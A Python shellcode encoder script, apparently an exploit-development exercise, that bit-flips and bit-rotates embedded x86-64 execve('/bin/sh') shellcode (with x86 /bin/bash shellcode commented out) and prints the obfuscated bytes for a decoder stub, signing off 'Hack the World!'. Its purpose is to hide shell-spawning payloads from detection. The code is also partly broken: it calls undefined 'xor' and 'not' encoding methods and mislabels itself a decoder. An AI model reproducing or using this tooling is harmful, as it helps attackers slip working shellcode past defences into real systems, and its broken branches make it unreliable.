#!/usr/bin/python3

# The FlipRotation Shellcode decoder
#
# Rotates back and flips the lowest bit of each byte.
#

import argparse
import secrets
import logging
import sys

#parser = argparse.ArgumentParser(description='[*] Miscellaneous Shellcode Encoder.')
#parser.add_argument('string', metavar='string', type=ascii, help='The string to be converted')

#args = parser.parse_args()

#logging.basicConfig(level=logging.DEBUG)
#logging.basicConfig(level=logging.INFO)

secretsGenerator = secrets.SystemRandom()

#c_style_shellcode = (b"\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x2f\x2f\x2f\x2f\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80") # bin/bash - execve stack technique shellcode -> execve(/bin/bash,/bin/bash,0)

c_style_shellcode = (b"\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05") # bin/sh

#c_style_shellcode = b"\x31\xc1"

def banner():

    print('''
        
        _______________________________________________________________
         <The "FlipRotation" Encoder - Bit flip and rotate your shellcode
        ---------------------------------------------------------------
            \   ^__^
            \   (oo)\_______
                (__)\       )\/\\
                    ||----w |
                    ||     ||       
        
         ''')

#----------------------------


def bin2hex(binstr):
    return hex(int(binstr,2))

class Encoder:

    def randomKeyGenerator(self):
        byte = '0x'
        for i in range(2):
            hexDigits = [0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,0x0a,0x0b,0x0c,0x0d,0x0e,0x0f]
            nibble = secretsGenerator.choice(hexDigits) # it gets in decimal not hex format
            #print("nibble----"+hex(nibble)[2:])
            byte = byte + hex(nibble)[2:] # hex class is str type. Appending to 0x
        #print(byte)
        #chr(int(byte,16)) # converts from base 16 to integer (decimal) and then to ascii (chr func) 
        #print(int(byte,16))
        return int(byte,16) # convert key to bytes and return


    def __init__(self,enc_type, key=None):
        if enc_type != "not":
            
            if key is not None:
                self.key = key
                print("[*] Key Provided by the user. Doing magic with it")
            else:
                self.key = self.randomKeyGenerator()
                print("[*] Doing magic with a (pseudo) Random key")
            print("[*] Key: "+hex(self.key))

 
    # Function to left
    # rotate n by d bits
    def leftRotate(self,shellbits, d):
        tmp = shellbits[d:] + shellbits[0:d]
        return tmp
    
    # Function to right
    # rotate n by d bits
    def rightRotate(self, shellbits, d):
        return self.leftRotate(shellbits, len(shellbits) - d)
        
   
    
    def insertion_encode(self, shellcode):

        encoded = '' # 0x format
        encoded2 = '' # \x format
        rotation_direction = ''
        
        rotation_counter = 0
        for shellbyte in shellcode:
            
            flipped_shellbyte = shellbyte ^ 0x01    # flip lowest bit
            
            if bin(flipped_shellbyte)[-1] == '0':
                logging.info("Flipped byte - odd - "+str(flipped_shellbyte))
                rotated_shellbyte = self.rightRotate(format(flipped_shellbyte,'08b'),rotation_counter% 8 ) # 8 because we are rotating with 8 bits
                rotation_direction = '0x02' 
            else:
                logging.info("Flipped byte - even - "+str(flipped_shellbyte))
                rotated_shellbyte = self.leftRotate(format(flipped_shellbyte,'08b'),rotation_counter% 8 )  # 8 because we are rotating with 8 bits
                print("After rotation: "+ bin2hex(self.leftRotate(format(flipped_shellbyte,'08b'),rotation_counter%8)))
                rotation_direction = '0xff'
            
            final_shellbyte =  bin2hex(rotated_shellbyte)
            
            rotation_counter += 1

            encoded += final_shellbyte + ',' + rotation_direction +','  # \x format

            encoded2 += '\\x' + final_shellbyte[2:] + '\\x' + rotation_direction[2:] # \x format

        print("\n[*] \\x format: ")
        encoded2 += '\\x' + hex(self.key)[2:] + '\\x' + hex(self.key)[2:]  # add marker
        print(encoded2)
            
        print("\n[*] 0x format: ")
        encoded += '0x' + hex(self.key)[2:] + ',' + '0x' + hex(self.key)[2:] #add marker
        print(encoded)



def main():
   
    shellcode = bytearray(c_style_shellcode)
    print("[*] Shellcode length: "+str(len(shellcode))+"\n")
    print("[*] Shellcode: "+str(c_style_shellcode)+"\n")

    # -------------------KEY-------------- 
    key = 0xa0  # can't be 0x02 or 0xff. used for rotation direction
    #key = None
    #####################################

    # -------------Encode Type-----------
    enc_type = "insertion"
    #####################################

    #if key is not None:
     #   key = bytes.fromhex(key)
      #  logging.debug(key)
    
    if enc_type == "not":

        encoder = Encoder(enc_type)
        encoder.complement_encoding(shellcode)

    elif enc_type == "xor":
    
        encoder = Encoder(enc_type, key)
        encoder.xor_encoding_backslashX(shellcode)# utf-8 encoding (\x4b,\xe4,...)
        encoder.xor_encoding_0x(shellcode) # hex format (0x4b, 0xe4,...)
    
    elif enc_type == "insertion":
        encoder = Encoder(enc_type, key)
        encoder.insertion_encode(shellcode)
           
    else:
        print("[*] Encode type not supported. Please check the supported algorithms in the help menu")
        #sys.exit()






if __name__ == '__main__':

    banner() # displays the program banner
    main()
    print("\n--------------------")
    print("[*] Hack the World!")
    print("--------------------")
    print()
    print()

